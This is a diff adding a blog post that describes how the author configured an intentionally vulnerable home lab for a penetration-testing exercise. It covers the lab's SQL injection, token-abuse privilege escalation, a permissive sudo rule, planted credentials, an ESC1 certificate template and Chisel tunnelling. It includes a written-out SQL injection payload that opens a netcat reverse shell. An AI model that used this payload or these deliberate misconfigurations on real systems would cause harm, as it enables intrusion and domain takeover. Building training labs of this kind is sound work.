@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Matthew Castro - Blog</title>
+    <link rel="icon" type="image/x-icon" href="../assets/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
+        rel="stylesheet" type="text/css" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="../css/styles.css" rel="stylesheet" />
+    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
+    <link rel="preload" as="image" href="/assets/img/posts.jpg">
+</head>
+
+<body>
+    <!-- Navigation-->
+    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+        <div class="container px-4 px-lg-5">
+            <a class="navbar-brand" href="../index.html">Matthew Castro</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
+                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                Menu
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarResponsive">
+                <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../index.html">Homelab</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../reports.html">Reports</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../Write-ups.html">Write-ups</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../about.html">About</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Page Header-->
+    <header class="masthead" style="background-image: url('../assets/img/posts.jpg')">
+        <div class="container position-relative px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <div class="post-heading">
+                        <h1>Configuring Attack Chain #2</h1>
+                        <h2 class="subheading">All of the steps taken in configuring attack chain #2.</h2>
+                        <span class="meta">
+                            Posted on January 1st, 2026
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Post Content-->
+    <article class="mb-4">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+
+                    <h2 id="table-of-contents">Table of Contents</h2>
+                    <ul>
+                        <li><a href="#introduction">Introduction</a></li>
+                        <li><a href="#attack-chain-summary">Attack Chain Summary</a></li>
+                        <li><a href="#configuration">Configuration</a>
+                            <ul>
+                                <li><a href="#configuring-the-website">Configuring the Website</a></li>
+                                <li><a href="#configuring-a-privilege-escalation-vector-on-pc02">Configuring a Privilege
+                                        Escalation Vector on PC02</a></li>
+                                <li><a href="#creating-a-lateral-movement-path-from-pc02-to-pc03">Creating a Lateral
+                                        Movement Path from PC02 to PC03</a></li>
+                                <li><a href="#configuring-a-privilege-escalation-vector-on-pc03">Configuring a Privilege
+                                        Escalation Vector on PC03</a></li>
+                                <li><a href="#creating-a-lateral-movement-path-from-pc02-to-pc01">Creating a Lateral
+                                        Movement Path from PC02 to PC01</a></li>
+                                <li><a href="#placing-domain-credentials-on-pc01">Placing Domain Credentials on PC01</a>
+                                </li>
+                                <li><a href="#configuring-a-vulnerable-ad-cs-template">Configuring a Vulnerable AD CS
+                                        Template</a></li>
+                                <li><a href="#ensuring-chisel-tunneling-is-functional">Ensuring Chisel Tunneling is
+                                        Functional</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="#conclusion">Conclusion</a></li>
+                    </ul>
+                    <h2 id="introduction">Introduction</h2>
+                    <p>
+                        In this document, we outline the configuration of all vulnerabilities required in attack chain
+                        #2. A complete pentesting report covering the full exploitation of the attack chain is available
+                        <a class="" href="../reports.html">here</a>.
+                    </p>
+                    <p>
+                        This document assumes the reader has basic knowledge of networking and Windows/Active Directory
+                        concepts.
+                    </p>
+                    <p>
+                        We will be adding onto the base configuration detailed in the document “Installing and
+                        Configuring my Home Lab”. The settings and configuration of attack chain #1 will not be
+                        modified.
+
+                    </p>
+                    <h2 id="attack-chain-summary">Attack Chain Summary</h2>
+                    <p>
+                        This will be an external assessment, meaning that our attack machine will be located outside of
+                        the internal network.
+                        </p>
+                        <p>
+                        Below is a layout of the homelab network.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/hl_setup/external1.png" alt="..." />
+                    <p>
+                        The attack chain we will be configuring is as follows:
+                    </p>
+                    <p>
+                        Initial access will be obtained through an SQLi vulnerability in a publicly facing web server
+                        hosted on PC02. This SQLi vulnerability will allow us to obtain RCE by leveraging the
+                        xp_cmdshell stored procedure in Microsoft SQL.
+                    </p>
+                    <p>
+                        After obtaining a reverse shell on PC02 using the method previously described, we escalate our
+                        privileges to SYSTEM by abusing the SeImpersonate privilege assigned to the NT
+                        SERVICE\MSSQL$SQLEXPRESS user. This will be done with the SigmaPotato token abuse tool.
+                    </p>
+                    <p>
+                        After obtaining SYSTEM level access to PC02, we find an SSH private key that allows us to connect
+                        as a low-level user to PC03. We then escalate our privileges by abusing insecure sudo
+                        permissions on the &quot;find&quot; binary assigned to the user. PC03 does not allow for any
+                        further lateral movement in this attack chain.
+                    </p>
+                    <p>
+                        We find domain credentials in a Windows unattended installation file back on PC02. These credentials can be used to
+                        obtain a WinRM session to PC01. 
+                    </p>
+                    <p>
+                        We find additional domain credentials on PC01 in a PowerShell script file without the need for privilege escalation.
+                        The account associated with the
+                        credentials can enroll in an insecure certificate template that allows us to specify any SPN
+                        that we want while enrolling (known as the ESC1 vulnerability). This is leveraged to request a TGT as the domain
+                        administrator and obtain unrestricted access to the network.
+                    </p>
+                    <h2 id="configuration">Configuration</h2>
+                    <p></p>
+                    <h4 id="configuring-the-website">Configuring the Website</h4>
+                    <p>
+                        The externally facing website configuration has been documented <a class="" href="../posts/PC02_website.html">here</a>. 
+                    </p>
+                    <h4 id="configuring-a-privilege-escalation-vector-on-pc02">Configuring a Privilege Escalation Vector
+                        on PC02</h4>
+                    <p>
+                        We will start by making sure that privilege escalation can be obtained on PC02 from a reverse
+                        shell in the SQL service context.
+                    </p>
+                    <p>
+                        We first disable Windows Defender on the machine. This is done so that the Windows netcat binary is not
+                        deleted from the machine by Defender after we upload it. There are methods to obfuscate the binary&#39;s
+                        signature and prevent deletion, but that is out of scope for this assessment.
+                    
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/1.png" alt="..." />
+                    <p>We place the Windows netcat binary in a temporary folder on the C: drive on PC02.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/2.png" alt="..." />
+                    <p>
+                        We then submit our reverse shell payload to the website from our Kali machine. The payload used
+                        is &#39;; EXEC xp_cmdshell &#39;C:\temp\nc64.exe 10.0.2.3 1234 -e cmd.exe&#39;; --. This command
+                        is a simplified version of the full SQLi attack we will be performing during the assessment.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/3.png" alt="..." />
+                    <p>
+                        We confirm that it works.
+                    </p>
+                    <p>
+                        We transfer the SigmaPotato binary from our Kali machine to PC02 using VirtualBox shared folders.
+                        We then check if we can use it to execute commands as SYSTEM from our netcat reverse shell.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/4.png" alt="..." />
+                    <p>
+                        It functions as intended. This method will be used to obtain an interactive administrator shell
+                        on PC02 during our assessment.
+                    </p>
+                    <h4 id="creating-a-lateral-movement-path-from-pc02-to-pc03">Creating a Lateral Movement Path from
+                        PC02 to PC03</h4>
+                    <p>
+                        We start by creating a low-privilege user on PC03.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/5.png" alt="..." />
+                    <p>
+                        We then generate an SSH key pair for the user.
+                     </p>
+                     <img class="img-fluid" src="../assets/img/attck_2/6.png" alt="..." />
+                    <p>
+                        We enter the public key in the authorized_keys file in user richard&#39;s home directory.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/7.png" alt="..." />
+                    <p>
+                        We place the key in a folder called &quot;SecretFolder&quot; on PC02.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/8.png" alt="..." />
+                    <p>
+                        We ensure that the contents of the folder are only accessible to administrators. We do this by
+                        removing all inheritance and assigning permissions only to the local administrator.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/9.png" alt="..." />
+                    <p>
+                        We select the local administrators group on PC02.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/10.png" alt="..." />
+                    <p>We set the permissions.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/11.png" alt="..." />
+                    <p>
+                        We also create an extra user in our Active Directory domain called Richard Smith. During our
+                        assessment, this user&#39;s first name will allow us to guess the username associated with the
+                        SSH key.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/12.png" alt="..." />
+                    <p>We then reboot our Kali machine after setting its network adapter to &quot;internal
+                        network&quot;. This is done for testing purposes, as during the assessment the Kali machine will
+                        not be present on the internal network. We transfer user richard&#39;s private key to the Kali
+                        machine and attempt to connect to PC03 via SSH.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/13.png" alt="..." />
+                    <p>
+                        The connection is successful.
+                    </p>
+                    <h4 id="configuring-a-privilege-escalation-vector-on-pc03">Configuring a Privilege Escalation Vector
+                        on PC03</h4>
+                    <p>
+                        We use visudo to add the following line to the sudoers file:
+                        &quot;richard ALL=(ALL) NOPASSWD: /usr/bin/find&quot;
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/14.png" alt="..." />
+                    <p>
+                        This will allow user richard to run the find binary with sudo. Using GTFOBins, this will allow us
+                        to escalate our privileges to root. We confirm that the privilege assignment worked with sudo
+                        -l.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/15.png" alt="..." />
+                    <p></p>
+                    <h4 id="creating-a-lateral-movement-path-from-pc02-to-pc01">Creating a Lateral Movement Path from
+                        PC02 to PC01</h4>
+                    <p>
+                        We paste the contents of the file found at this link <u>https://gist.github.com/mdowst/e81cc0608a0c554d8c3381ebc7b6e15e</u></a>
+                        to C:\Windows\Panther\Unattend.xml on PC02.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/16.png" alt="..." />
+                    <p>
+                        We enter the credentials for domain user Tristan Blake in the &quot;Autologon&quot; section of
+                        the XML file.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/17.png" alt="..." />
+                    <p>
+                        We add user Tristan Blake to the Remote Management Users group on PC01. During the assessment,
+                        this will allow us to establish a remote session on PC01 once we obtain the credentials from the
+                        unattend file on PC02.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/18.png" alt="..." />
+                    <p>We make sure the user was added successfully to the group:</p>
+                    <img class="img-fluid" src="../assets/img/attck_2/19.png" alt="..." />
+                    <p></p>
+                    <h4 id="placing-domain-credentials-on-pc01">Placing Domain Credentials on PC01</h4>
+                    <p>We create the following text file in user Tristan Blake&#39;s Documents directory.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/20.png" alt="..." />
+                    <p>
+                        This will allow us to obtain the credentials for user "lhartman" once we gain low-level access on
+                        PC01. Although finding cleartext credentials in this location is not very realistic, it is meant
+                        to simulate credential discovery once we obtain a remote session on PC01.
+                    </p>
+                    <h4 id="configuring-a-vulnerable-ad-cs-template">Configuring a Vulnerable AD CS Template</h4>
+                    <p>
+                        We start by installing the Active Directory Certificate Services Role to machine DC01.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/21.png" alt="..." />
+                    <p>We then open the AD CS setup and leave all settings to their default values.
+                    </p>
+                     <img class="img-fluid" src="../assets/img/attck_2/22.png" alt="..." />
+                    <p>
+                        We should now be able to create a custom AD CS template.
+                        We open the Certification Authority Console and duplicate the &quot;User&quot; template.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/23.png" alt="..." />
+                    <p>
+                        We leave the Compatibility tab at its default settings.
+                    </p>
+                    <p>
+                        In the General tab, we name our custom template &quot;user_enroll&quot;.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/24.png" alt="..." />
+                    <p>
+                        In the Subject Name tab, we select &quot;Supply in the request&quot;. This creates a
+                        vulnerability where a user can supply any UPN while requesting the certificate, allowing for domain
+                        user impersonation.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/25.png" alt="..." />
+                    <p>
+                        In the &quot;Security&quot; tab, we first ensure that domain users do not have enrollment rights.
+                        This is done by deleting the group from the list.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/26.png" alt="..." />
+                    <p>We then allow user "lhartman" to enroll. </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/27.png" alt="..." />
+                    <p>
+                        We click Apply to save all of our settings.
+                        To make sure that certificate-based authentication is functional on the domain, we installed the
+                        CA&#39;s root certificate and CRL into the domain controller&#39;s trust store. We used the
+                        answer in this link as a guide to do so: https://github.com/ly4k/Certipy/issues/205.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/28.png" alt="..." />
+                    <p></p>
+                    <img class="img-fluid" src="../assets/img/attck_2/29.png" alt="..." />
+                    <p></p>
+                    <img class="img-fluid" src="../assets/img/attck_2/30.png" alt="..." />
+                    <p>
+                        We test the enrollment and usage with Certipy from our Kali machine. Note: We set the network
+                        adapter for our Kali machine to &quot;internal network&quot; for testing purposes.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/31.png" alt="..." />
+                    <p></p>
+                    <img class="img-fluid" src="../assets/img/attck_2/32.png" alt="..." />
+                    <p></p>
+                    <img class="img-fluid" src="../assets/img/attck_2/33.png" alt="..." />
+                    <p>
+                        The attack chain is now fully configured for the assessment.
+                    </p>
+                    <h4 id="ensuring-chisel-tunneling-is-functional">Ensuring Chisel Tunneling is Functional</h4>
+                    <p>
+                        We will now attempt to connect to PC03 on the internal network with SSH while our Kali machine is
+                        located on the NAT network. To do this, we will use a reverse tunnel using PC02 as our jump
+                        host. During the assessment, this step will be performed after gaining access to PC02.
+                    </p>
+                    <p>
+                        We start by transferring the Windows Chisel binary onto PC02. 
+                    </p>
+                    <p>
+                        We then start Chisel in server mode from our Kali machine.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/34.png" alt="..." />
+                    <p>
+                        We then attempt to connect back to our Chisel server using the reverse shell on PC02.
+                    </p>
+                    <img class="img-fluid" src="../assets/img/attck_2/35.png" alt="..." />
+                    <p>
+                        The connection attempt is successful.
+                        We attempt to connect to PC03 with SSH from our Kali machine using proxychains.
+                    </p>
+                     <img class="img-fluid" src="../assets/img/attck_2/36_2.png" alt="..." />
+                    <p>    
+                        It works. This means that during our assessment, we will be able to access the internal network
+                        once RCE on PC02 is obtained.
+                    </p>
+                    <h2 id="conclusion">Conclusion</h2>
+                    <p>Everything is now configured properly for us to perform our assessment. As we did after the
+                        configuration of Attack Chain #1, we save all the current machine states in VirtualBox as
+                        snapshots. </p>
+
+                </div>
+            </div>
+        </div>
+    </article>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+</body>
+
+</html>
